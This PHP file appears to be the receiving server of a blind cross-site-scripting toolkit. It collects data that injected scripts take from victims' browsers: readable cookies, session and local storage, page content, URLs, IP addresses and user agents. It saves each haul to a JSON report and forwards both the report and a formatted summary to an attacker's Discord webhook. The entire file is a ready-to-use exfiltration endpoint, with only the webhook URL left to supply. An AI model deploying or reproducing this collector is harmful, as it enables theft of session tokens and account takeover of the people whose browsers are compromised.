<?php

// include js
require_once('payloads.js');

// Default Setting
date_default_timezone_set('Asia/Tehran');
header("Access-Control-Allow-Origin: " . $_POST["origin"]);
$webhookUrl = "Enter Webhook Url";

// Init Data
$data = [
    'ua' => $_POST["ua"] ?? "",
    'tu' => $_POST["tu"] ?? "",
    'ru' => $_POST["ru"] ?? "",
    'rc' => $_POST["rc"] ?? "",
    'ss' => $_POST["ss"] ?? "",
    'ls' => $_POST["ls"] ?? "",
    'fd' => $_POST["fd"] ?? "",
    'hs' => $_POST["hs"] ?? "",
    'origin' => $_POST['origin'],
    'fv' => $_POST['origin'] . "/favicon.ico",
    'dt' => date('Y-m-d\TH:i:s.000\Z'),
    'fn' => $_POST['hs'] . '-' . time()
];

// send message
if ($data['origin']) {

    // Create Base Content
    $content = create_content($data);

    // Create File
    $file = create_file($content, $data['fn']);

    // send message to discord
    send_message_to_discord($data, $webhookUrl);

    // send file to discord
    send_file_to_discord($file, $webhookUrl);
}



function send_message_to_discord($data, $WebhookUrl)
{
    $ch = curl_init($WebhookUrl);

    # Setup request to send json via POST.
    $payload = json_encode([
        'content' => '',
        'embeds' => [
            0 => [
                'title' => 'XSS Report for ' . $data['hs'],
                'url' => $data['origin'],
                'color' => 0,
                'fields' =>
                    [
                        0 => [
                            'name' => 'IP ADDRESS',
                            'value' => '```js
Requester : `' . $_SERVER["REMOTE_ADDR"] . '`
Forwarded-For : `' . $_SERVER["HTTP_X_FORWARDED_FOR"] . '`
Referrer : `' . $_SERVER["HTTP_REFERER"] . '` ```',
                        ],
                        1 => [
                            'name' => 'USER AGENT',
                            'value' => '```js
' . $data['ua'] . ' ```',
                        ],
                        2 => [
                            'name' => 'TARGET URL',
                            'value' => '```js
`' . $data['tu'] . '` ```[・click here](' . $data['tu'] . ')',
                        ],
                        3 => [
                            'name' => 'REFERRER URL',
                            'value' => '```js
`' . $data['ru'] . '` ```',
                        ],
                        4 => [
                            'name' => 'READABLE COOKIES',
                            'value' => '```js
`' . $data['rc'] . '` ```',
                        ],
                        5 => [
                            'name' => 'SESSION STORAGE',
                            'value' => '```
' . $data['ss'] . ' ```',
                        ],
                        6 => [
                            'name' => 'LOCAL STORAGE',
                            'value' => '```
' . $data['ls'] . ' ```',
                        ],
                        7 => [
                            'name' => 'FILE NAME',
                            'value' => '```
' . $data['fn'].'.json' . ' ```',
                        ],
                    ],
                'author' =>
                    [
                        'name' => $data['hs'],
                        'url' => $data['origin'],
                        'icon_url' => $data['fv'],
                    ],
                'footer' =>
                    [
                        'text' => 'Created By @Zi_Gax',
                        'icon_url' => 'https://avatars.githubusercontent.com/u/67065043?v=4',
                    ]
            ],
        ],
        'username' => 'Xss',
        'avatar_url' => 'https://raw.githubusercontent.com/zi-gax/XSS-WebHook/master/media/xss.png',
        'attachments' => [],
    ]);


    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));

    # Return response instead of printing.
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    # Send request.
    $result = curl_exec($ch);
    curl_close($ch);
}

function create_content($data)
{
    return json_encode([
        'TITLE' => 'XSS Report for ' . $data['hs'],
        'URL' => $data['origin'],
        'TARGET URL' => $data['tu'],
        'IP ADDRESS' =>
            [
                'Requester' => $_SERVER["REMOTE_ADDR"],
                'Forwarded-For' => $_SERVER["HTTP_X_FORWARDED_FOR"],
                'Referrer' => $_SERVER["HTTP_REFERER"],
                'USER AGENT' => $data['ua'],
                'REFERRER URL' => $data['ru'],
            ],
        'STORAGE' =>
            [
                'READABLE COOKIES' => $data['rc'],
                'SESSION STORAGE' => $data['ss'],
                'LOCAL STORAGE' => $data['ls'],
            ],
        'content' => $data['fd'],
        'FILE NAME' => $data['fn'] . '.json',
        'timestamp' => $data['dt'],
        'Created By @Zi_Gax' => 'https://avatars.githubusercontent.com/u/67065043?v=4',
    ]);
}

function create_file($content, $file_name)
{
    $file_path = __DIR__ . '/reports/' . $file_name . '.json';
    file_put_contents($file_path, $content);
    return $file_path;
}

function send_file_to_discord($file, $webhook_url)
{


// The file you want to upload
    $file_path = $file;

// Create a cURL handle
    $ch = curl_init();

// Set the cURL options
    curl_setopt($ch, CURLOPT_URL, $webhook_url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Create the file upload data
    $file_data = array(
        'file' => new CURLFile($file_path)
    );

// Set the POST data for the file upload
    curl_setopt($ch, CURLOPT_POSTFIELDS, $file_data);

// Execute the cURL request
    curl_exec($ch);


// Close the cURL handle
    curl_close($ch);
}

?>
